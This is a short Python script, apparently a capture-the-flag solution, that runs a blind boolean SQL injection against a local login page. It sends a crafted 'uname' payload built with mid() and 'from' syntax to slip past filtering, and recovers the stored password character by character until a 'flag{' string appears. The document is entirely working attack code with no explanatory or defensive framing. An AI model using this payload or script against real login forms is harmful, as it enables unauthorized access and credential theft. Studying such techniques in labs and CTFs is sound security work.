import requests
import string
import sys
url = "http://127.0.0.1/web/login.php"

dic = string.ascii_letters + '0123456789_{}'
remark = ""
for j in range(1, 33):
    for i in dic:
        passwd = i + remark
        uname = "'!=(mid((passwd)from(-{j}))='{passwd}')='1".format(
            j=str(j), passwd=passwd)
        data = {"uname": uname, "passwd": "ddd"}
        res = requests.post(url, data)
        if "flag{" in remark:
            print '[*]Done.'
            sys.exit(0)
        if "password error!!" in res.text:
            remark = passwd
            print remark
            break
